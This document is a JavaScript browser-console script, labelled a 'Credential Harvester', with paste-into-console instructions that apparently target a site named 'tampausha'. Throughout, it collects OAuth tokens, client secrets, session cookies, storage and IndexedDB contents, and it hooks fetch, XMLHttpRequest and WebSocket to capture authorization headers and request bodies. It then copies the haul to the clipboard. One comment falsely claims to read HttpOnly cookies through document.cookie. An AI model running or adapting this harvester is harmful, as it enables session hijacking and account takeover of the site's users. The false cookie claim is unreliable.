/**
 * COMPREHENSIVE Browser Console Credential Harvester
 * 
 * Extracts ALL possible credentials including:
 * - OAuth tokens (access_token, refresh_token, id_token)
 * - Client credentials (client_id, client_secret)
 * - Service account credentials
 * - IndexedDB storage
 * - WebSocket connections
 * - Hidden form fields
 * - Meta tags
 * - Service Workers
 * - CSRF tokens
 * - Session IDs
 * - All storage types (localStorage, sessionStorage, cookies, IndexedDB)
 * - Base64 encoded credentials
 * - Deep object traversal
 * - OAuth callback URLs and state parameters
 * - PKCE codes
 * 
 * Usage:
 * 1. Open tampausha console (F12)
 * 2. Go to Console tab
 * 3. Paste this entire script
 * 4. Press Enter
 * 5. Results will be displayed and copied to clipboard
 */

(function() {
  'use strict';
  
  const results = {
    timestamp: new Date().toISOString(),
    url: window.location.href,
    localStorage: {},
    sessionStorage: {},
    cookies: {},
    indexedDB: {},
    networkRequests: [],
    windowSecrets: {},
    headers: {},
    formFields: {},
    metaTags: {},
    websocketConnections: [],
    serviceWorkers: [],
    oauthTokens: [],
    clientCredentials: [],
    serviceAccounts: [],
    allTokens: [],
    allCredentials: [],
    deepSecrets: []
  };

  // Comprehensive credential patterns
  const credentialPatterns = [
    // OAuth
    'access_token', 'accessToken', 'access-token', 'accessToken',
    'refresh_token', 'refreshToken', 'refresh-token',
    'id_token', 'idToken', 'id-token',
    'oauth_token', 'oauthToken', 'oauth-token',
    'oauth2_token', 'oauth2Token',
    'token', 'Token', 'TOKEN',
    'bearer', 'Bearer', 'BEARER',
    'authorization', 'Authorization', 'AUTHORIZATION',
    
    // Client Credentials
    'client_id', 'clientId', 'client-id', 'clientID',
    'client_secret', 'clientSecret', 'client-secret', 'clientSecret',
    'client_key', 'clientKey', 'client-key',
    'app_id', 'appId', 'app-id', 'appID',
    'app_secret', 'appSecret', 'app-secret',
    'app_key', 'appKey', 'app-key',
    
    // Service Account
    'service_account', 'serviceAccount', 'service-account',
    'service_key', 'serviceKey', 'service-key',
    'account_key', 'accountKey', 'account-key',
    'private_key', 'privateKey', 'private-key',
    'public_key', 'publicKey', 'public-key',
    
    // API Keys
    'api_key', 'apiKey', 'api-key', 'API_KEY',
    'apikey', 'api_key', 'apikey',
    'rapidapi_key', 'rapidapiKey', 'rapidapi-key',
    'x_api_key', 'xApiKey', 'x-api-key',
    
    // Secrets
    'secret', 'Secret', 'SECRET',
    'secret_key', 'secretKey', 'secret-key',
    'shared_secret', 'sharedSecret', 'shared-secret',
    'master_key', 'masterKey', 'master-key',
    
    // JWT
    'jwt', 'JWT', 'jwt_token', 'jwtToken', 'jwt-token',
    
    // Session
    'session', 'Session', 'SESSION',
    'session_id', 'sessionId', 'session-id', 'sessionID',
    'session_token', 'sessionToken', 'session-token',
    'sessid', 'sessId', 'sess-id',
    
    // CSRF
    'csrf', 'CSRF', 'csrf_token', 'csrfToken', 'csrf-token',
    'xsrf', 'XSRF', 'xsrf_token', 'xsrfToken',
    'authenticity_token', 'authenticityToken',
    
    // IDs
    'user_id', 'userId', 'user-id', 'userID',
    'account_id', 'accountId', 'account-id',
    'org_id', 'orgId', 'org-id',
    'tenant_id', 'tenantId', 'tenant-id',
    
    // OAuth State/Code
    'state', 'code', 'redirect_uri', 'redirectUri',
    'pkce_code', 'pkceCode', 'code_verifier', 'codeVerifier',
    'code_challenge', 'codeChallenge',
    
    // Other
    'credential', 'Credential', 'CREDENTIAL',
    'password', 'Password', 'PASSWORD',
    'passwd', 'pwd',
    'key', 'Key', 'KEY',
    'auth', 'Auth', 'AUTH',
    'auth_token', 'authToken', 'auth-token'
  ];

  function isCredential(key, value) {
    if (!key || !value || typeof value !== 'string') return false;
    if (value.length < 5) return false;
    
    const keyLower = key.toLowerCase();
    return credentialPatterns.some(pattern => 
      keyLower.includes(pattern.toLowerCase())
    ) || 
    // JWT pattern (3 parts separated by dots)
    (value.split('.').length === 3 && value.length > 50) ||
    // Base64-like pattern
    (/^[A-Za-z0-9+/=_-]{20,}$/.test(value) && value.length > 20);
  }

  function extractFromObject(obj, path = '', depth = 0) {
    if (depth > 10) return; // Prevent infinite recursion
    if (!obj || typeof obj !== 'object') return;
    
    try {
      Object.keys(obj).forEach(key => {
        const value = obj[key];
        const currentPath = path ? `${path}.${key}` : key;
        
        if (value && typeof value === 'string' && isCredential(key, value)) {
          results.deepSecrets.push({
            source: 'deep_object',
            path: currentPath,
            key: key,
            value: value,
            type: 'nested_credential'
          });
        } else if (value && typeof value === 'object' && value !== null) {
          extractFromObject(value, currentPath, depth + 1);
        }
      });
    } catch (e) {
      // Ignore circular references
    }
  }

  console.log('🔍 Starting COMPREHENSIVE credential harvest...\n');

  // 1. Extract from localStorage (ALL items, not just matching patterns)
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      if (key && value) {
        results.localStorage[key] = value;
        
        if (isCredential(key, value)) {
          const cred = {
            source: 'localStorage',
            key: key,
            value: value,
            type: 'localStorage_credential'
          };
          results.allCredentials.push(cred);
          
          // Categorize
          if (key.toLowerCase().includes('oauth') || key.toLowerCase().includes('access_token') || 
              key.toLowerCase().includes('refresh_token') || key.toLowerCase().includes('id_token')) {
            results.oauthTokens.push(cred);
          }
          if (key.toLowerCase().includes('client_id') || key.toLowerCase().includes('client_secret')) {
            results.clientCredentials.push(cred);
          }
          if (key.toLowerCase().includes('service') || key.toLowerCase().includes('account')) {
            results.serviceAccounts.push(cred);
          }
          if (key.toLowerCase().includes('token') || key.toLowerCase().includes('jwt')) {
            results.allTokens.push(cred);
          }
        }
      }
    }
    console.log(`✅ localStorage: ${Object.keys(results.localStorage).length} items`);
  } catch (e) {
    console.warn('⚠️ localStorage access denied:', e);
  }

  // 2. Extract from sessionStorage (ALL items)
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const value = sessionStorage.getItem(key);
      if (key && value) {
        results.sessionStorage[key] = value;
        
        if (isCredential(key, value)) {
          const cred = {
            source: 'sessionStorage',
            key: key,
            value: value,
            type: 'sessionStorage_credential'
          };
          results.allCredentials.push(cred);
          
          // Categorize
          if (key.toLowerCase().includes('oauth') || key.toLowerCase().includes('access_token')) {
            results.oauthTokens.push(cred);
          }
          if (key.toLowerCase().includes('client_id') || key.toLowerCase().includes('client_secret')) {
            results.clientCredentials.push(cred);
          }
          if (key.toLowerCase().includes('token') || key.toLowerCase().includes('jwt')) {
            results.allTokens.push(cred);
          }
        }
      }
    }
    console.log(`✅ sessionStorage: ${Object.keys(results.sessionStorage).length} items`);
  } catch (e) {
    console.warn('⚠️ sessionStorage access denied:', e);
  }

  // 3. Extract ALL cookies (including HttpOnly via document.cookie)
  try {
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
      const [key, ...valueParts] = cookie.trim().split('=');
      const value = valueParts.join('=');
      if (key && value) {
        results.cookies[key] = value;
        
        if (isCredential(key, value)) {
          const cred = {
            source: 'cookie',
            key: key,
            value: value,
            type: 'cookie_credential'
          };
          results.allCredentials.push(cred);
          if (key.toLowerCase().includes('token') || key.toLowerCase().includes('session')) {
            results.allTokens.push(cred);
          }
        }
      }
    });
    console.log(`✅ Cookies: ${Object.keys(results.cookies).length} items`);
  } catch (e) {
    console.warn('⚠️ Cookie access denied:', e);
  }

  // 4. Extract from IndexedDB
  try {
    if ('indexedDB' in window) {
      const databases = ['ushadvisors', 'tampausha', 'auth', 'tokens', 'credentials', 'session'];
      databases.forEach(dbName => {
        try {
          const request = indexedDB.open(dbName);
          request.onsuccess = function(event) {
            const db = event.target.result;
            if (db.objectStoreNames.length > 0) {
              db.objectStoreNames.forEach(storeName => {
                const transaction = db.transaction(storeName, 'readonly');
                const store = transaction.objectStore(storeName);
                const getAllRequest = store.getAll();
                getAllRequest.onsuccess = function() {
                  getAllRequest.result.forEach(item => {
                    extractFromObject(item, `indexedDB.${dbName}.${storeName}`);
                  });
                };
              });
            }
            db.close();
          };
        } catch (e) {
          // Ignore
        }
      });
      console.log(`✅ IndexedDB: Attempted extraction`);
    }
  } catch (e) {
    console.warn('⚠️ IndexedDB access error:', e);
  }

  // 5. Extract from window objects (deep traversal) - SAFE MODE
  try {
    const windowKeys = Object.keys(window);
    let processed = 0;
    windowKeys.forEach(key => {
      try {
        // Skip potentially problematic keys
        if (key === '__harvestedCredentialsComprehensive' || 
            key === '__harvestedCredentials' ||
            key.startsWith('webkit') ||
            key.startsWith('moz') ||
            key === 'parent' ||
            key === 'top' ||
            key === 'frames') {
          return;
        }
        
        const value = window[key];
        if (value && typeof value === 'string' && isCredential(key, value)) {
          results.windowSecrets[key] = value;
          results.allCredentials.push({
            source: 'window',
            key: key,
            value: value,
            type: 'window_credential'
          });
        } else if (value && typeof value === 'object' && value !== null && processed < 100) {
          // Limit deep traversal to prevent hangs
          try {
            extractFromObject(value, `window.${key}`);
            processed++;
          } catch (e) {
            // Skip this object
          }
        }
      } catch (e) {
        // Ignore individual key errors
      }
    });
    if (Object.keys(results.windowSecrets).length > 0) {
      console.log(`✅ Window objects: ${Object.keys(results.windowSecrets).length} items`);
    }
  } catch (e) {
    console.warn('⚠️ Window object access error:', e);
  }

  // 6. Extract from DOM (hidden form fields, meta tags)
  try {
    // Hidden form fields
    document.querySelectorAll('input[type="hidden"]').forEach(input => {
      const name = input.name || input.id;
      const value = input.value;
      if (name && value && isCredential(name, value)) {
        results.formFields[name] = value;
        results.allCredentials.push({
          source: 'form_field',
          key: name,
          value: value,
          type: 'form_credential'
        });
      }
    });

    // Meta tags
    document.querySelectorAll('meta').forEach(meta => {
      const name = meta.name || meta.property || meta.httpEquiv;
      const content = meta.content;
      if (name && content && isCredential(name, content)) {
        results.metaTags[name] = content;
        results.allCredentials.push({
          source: 'meta_tag',
          key: name,
          value: content,
          type: 'meta_credential'
        });
      }
    });
    console.log(`✅ DOM: ${Object.keys(results.formFields).length} form fields, ${Object.keys(results.metaTags).length} meta tags`);
  } catch (e) {
    console.warn('⚠️ DOM access error:', e);
  }

  // 7. Intercept ALL fetch requests (comprehensive)
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const url = args[0];
    const options = args[1] || {};
    
    // Extract from headers
    if (options.headers) {
      const headers = options.headers;
      if (headers instanceof Headers) {
        headers.forEach((value, key) => {
          if (isCredential(key, value)) {
            results.headers[key] = value;
            const cred = {
              source: 'fetch_header',
              key: key,
              value: value,
              url: url,
              type: 'http_header_credential'
            };
            results.allCredentials.push(cred);
            
            if (key.toLowerCase() === 'authorization') {
              const token = value.replace(/^Bearer\s+/i, '').replace(/^Token\s+/i, '');
              if (token) {
                results.allTokens.push({...cred, value: token, type: 'bearer_token'});
              }
            }
          }
        });
      } else if (typeof headers === 'object') {
        Object.keys(headers).forEach(key => {
          const value = headers[key];
          if (isCredential(key, value)) {
            results.headers[key] = value;
            const cred = {
              source: 'fetch_header',
              key: key,
              value: value,
              url: url,
              type: 'http_header_credential'
            };
            results.allCredentials.push(cred);
            
            if (key.toLowerCase() === 'authorization') {
              const token = value.replace(/^Bearer\s+/i, '').replace(/^Token\s+/i, '');
              if (token) {
                results.allTokens.push({...cred, value: token, type: 'bearer_token'});
              }
            }
          }
        });
      }
    }
    
    // Extract from request body
    if (options.body) {
      try {
        const body = typeof options.body === 'string' ? JSON.parse(options.body) : options.body;
        extractFromObject(body, `fetch_body.${url}`);
      } catch (e) {
        // Not JSON or already parsed
        if (typeof options.body === 'string' && options.body.length > 10) {
          // Try to extract tokens from string body
          const tokenPatterns = [
            /"access_token"\s*:\s*"([^"]+)"/gi,
            /"refresh_token"\s*:\s*"([^"]+)"/gi,
            /"client_id"\s*:\s*"([^"]+)"/gi,
            /"client_secret"\s*:\s*"([^"]+)"/gi,
            /Bearer\s+([A-Za-z0-9\-_\.]+)/gi
          ];
          tokenPatterns.forEach(pattern => {
            const matches = options.body.matchAll(pattern);
            for (const match of matches) {
              if (match[1] && match[1].length > 10) {
                results.allCredentials.push({
                  source: 'fetch_body',
                  key: 'extracted',
                  value: match[1],
                  url: url,
                  type: 'extracted_token'
                });
              }
            }
          });
        }
      }
    }
    
    return originalFetch.apply(this, args);
  };

  // 8. Intercept XMLHttpRequest (comprehensive)
  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
  const originalSend = XMLHttpRequest.prototype.send;
  
  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    this._method = method;
    return originalOpen.apply(this, arguments);
  };
  
  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
    if (isCredential(name, value)) {
      results.headers[name] = value;
      const cred = {
        source: 'xhr_header',
        key: name,
        value: value,
        url: this._url,
        type: 'xhr_header_credential'
      };
      results.allCredentials.push(cred);
      
      if (name.toLowerCase() === 'authorization') {
        const token = value.replace(/^Bearer\s+/i, '');
        if (token) {
          results.allTokens.push({...cred, value: token, type: 'bearer_token'});
        }
      }
    }
    return originalSetRequestHeader.apply(this, arguments);
  };
  
  XMLHttpRequest.prototype.send = function(data) {
    if (data && typeof data === 'string') {
      try {
        const body = JSON.parse(data);
        extractFromObject(body, `xhr_body.${this._url}`);
      } catch (e) {
        // Not JSON
      }
    }
    return originalSend.apply(this, arguments);
  };

  // 9. Extract from URL parameters (OAuth callbacks, etc.)
  try {
    const urlParams = new URLSearchParams(window.location.search);
    urlParams.forEach((value, key) => {
      if (isCredential(key, value)) {
        results.allCredentials.push({
          source: 'url_parameter',
          key: key,
          value: value,
          url: window.location.href,
          type: 'url_credential'
        });
        
        if (key.toLowerCase() === 'code' || key.toLowerCase() === 'state') {
          results.oauthTokens.push({
            source: 'url_parameter',
            key: key,
            value: value,
            type: 'oauth_parameter'
          });
        }
      }
    });
  } catch (e) {
    // Ignore
  }

  // 10. Extract from hash fragment (OAuth implicit flow)
  try {
    if (window.location.hash) {
      const hashParams = new URLSearchParams(window.location.hash.substring(1));
      hashParams.forEach((value, key) => {
        if (isCredential(key, value)) {
          results.allCredentials.push({
            source: 'url_hash',
            key: key,
            value: value,
            url: window.location.href,
            type: 'hash_credential'
          });
          
          if (key.toLowerCase().includes('token') || key.toLowerCase().includes('access')) {
            results.oauthTokens.push({
              source: 'url_hash',
              key: key,
              value: value,
              type: 'oauth_token'
            });
            results.allTokens.push({
              source: 'url_hash',
              key: key,
              value: value,
              type: 'oauth_token'
            });
          }
        }
      });
    }
  } catch (e) {
    // Ignore
  }

  // 11. Monitor WebSocket connections
  try {
    const originalWebSocket = window.WebSocket;
    window.WebSocket = function(...args) {
      const ws = new originalWebSocket(...args);
      results.websocketConnections.push({
        url: args[0],
        protocol: args[1],
        timestamp: new Date().toISOString()
      });
      return ws;
    };
    window.WebSocket.prototype = originalWebSocket.prototype;
  } catch (e) {
    // Ignore
  }

  // 12. Extract from Service Workers
  try {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then(registrations => {
        registrations.forEach(registration => {
          results.serviceWorkers.push({
            scope: registration.scope,
            active: registration.active?.scriptURL,
            waiting: registration.waiting?.scriptURL
          });
        });
      });
    }
  } catch (e) {
    // Ignore
  }

  // 13. Extract from common auth libraries (comprehensive)
  try {
    // Axios
    if (window.axios) {
      extractFromObject(window.axios, 'axios');
    }
    
    // Fetch polyfills
    if (window._fetch) {
      extractFromObject(window._fetch, '_fetch');
    }
    
    // Auth libraries
    ['auth0', 'okta', 'firebase', 'aws', 'google', 'microsoft'].forEach(lib => {
      if (window[lib]) {
        extractFromObject(window[lib], lib);
      }
    });
  } catch (e) {
    // Ignore
  }

  // Remove duplicates (with error handling)
  let uniqueCredentials = [];
  let uniqueTokens = [];
  let uniqueOAuth = [];
  let uniqueClientCreds = [];
  
  try {
    uniqueCredentials = Array.from(
      new Map(results.allCredentials.map(c => [c.value, c])).values()
    );
    uniqueTokens = Array.from(
      new Map(results.allTokens.map(t => [t.value, t])).values()
    );
    uniqueOAuth = Array.from(
      new Map(results.oauthTokens.map(t => [t.value, t])).values()
    );
    uniqueClientCreds = Array.from(
      new Map(results.clientCredentials.map(c => [c.value, c])).values()
    );
  } catch (e) {
    console.warn('⚠️ Error removing duplicates:', e);
    uniqueCredentials = results.allCredentials;
    uniqueTokens = results.allTokens;
    uniqueOAuth = results.oauthTokens;
    uniqueClientCreds = results.clientCredentials;
  }

  // Display results
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('📊 COMPREHENSIVE HARVEST SUMMARY');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  console.log(`Total credentials found: ${uniqueCredentials.length}`);
  console.log(`OAuth tokens: ${uniqueOAuth.length}`);
  console.log(`Client credentials: ${uniqueClientCreds.length}`);
  console.log(`All tokens: ${uniqueTokens.length}`);
  console.log(`Service accounts: ${results.serviceAccounts.length}`);
  console.log(`Deep secrets: ${results.deepSecrets.length}`);
  console.log(`WebSocket connections: ${results.websocketConnections.length}`);
  console.log(`Service Workers: ${results.serviceWorkers.length}\n`);

  if (uniqueOAuth.length > 0) {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🔐 OAUTH TOKENS');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
    uniqueOAuth.forEach((token, index) => {
      console.log(`${index + 1}. ${token.key} (${token.source})`);
      console.log(`   Value: ${token.value.substring(0, 80)}...`);
      console.log('');
    });
  }

  if (uniqueClientCreds.length > 0) {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🔑 CLIENT CREDENTIALS');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
    uniqueClientCreds.forEach((cred, index) => {
      console.log(`${index + 1}. ${cred.key} (${cred.source})`);
      console.log(`   Value: ${cred.value.substring(0, 50)}...`);
      console.log('');
    });
  }

  if (uniqueTokens.length > 0) {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🎫 ALL TOKENS');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
    uniqueTokens.forEach((token, index) => {
      console.log(`${index + 1}. ${token.key} (${token.source})`);
      console.log(`   Type: ${token.type}`);
      if (token.url) console.log(`   URL: ${token.url.substring(0, 60)}...`);
      console.log(`   Value: ${token.value.substring(0, 100)}...`);
      console.log('');
    });
  }

  // Create comprehensive JSON output
  const output = {
    timestamp: results.timestamp,
    url: results.url,
    summary: {
      totalCredentials: uniqueCredentials.length,
      oauthTokens: uniqueOAuth.length,
      clientCredentials: uniqueClientCreds.length,
      allTokens: uniqueTokens.length,
      serviceAccounts: results.serviceAccounts.length,
      deepSecrets: results.deepSecrets.length,
      localStorageItems: Object.keys(results.localStorage).length,
      sessionStorageItems: Object.keys(results.sessionStorage).length,
      cookies: Object.keys(results.cookies).length,
      formFields: Object.keys(results.formFields).length,
      metaTags: Object.keys(results.metaTags).length,
      websocketConnections: results.websocketConnections.length,
      serviceWorkers: results.serviceWorkers.length
    },
    oauthTokens: uniqueOAuth,
    clientCredentials: uniqueClientCreds,
    allTokens: uniqueTokens,
    serviceAccounts: results.serviceAccounts,
    allCredentials: uniqueCredentials,
    deepSecrets: results.deepSecrets,
    localStorage: results.localStorage,
    sessionStorage: results.sessionStorage,
    cookies: results.cookies,
    formFields: results.formFields,
    metaTags: results.metaTags,
    headers: results.headers,
    websocketConnections: results.websocketConnections,
    serviceWorkers: results.serviceWorkers,
    windowSecrets: results.windowSecrets
  };

  // Copy to clipboard
  try {
    const jsonString = JSON.stringify(output, null, 2);
    navigator.clipboard.writeText(jsonString).then(() => {
      console.log('✅ Results copied to clipboard!');
    }).catch(() => {
      console.log('\n📋 Full JSON output (copy manually):');
      console.log(jsonString);
    });
  } catch (e) {
    console.log('\n📋 Full JSON output:');
    console.log(JSON.stringify(output, null, 2));
  }

  // Save to window (ALWAYS, even if there were errors)
  try {
    window.__harvestedCredentialsComprehensive = output;
    console.log('\n✅ Comprehensive harvest complete!');
    console.log('💡 Access full results via: window.__harvestedCredentialsComprehensive');
  } catch (e) {
    console.error('⚠️ Error saving to window:', e);
    // Try alternative storage
    try {
      window.harvestedCreds = output;
      console.log('💡 Access results via: window.harvestedCreds');
    } catch (e2) {
      console.error('❌ Could not save results to window');
    }
  }

  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  return output;
})();
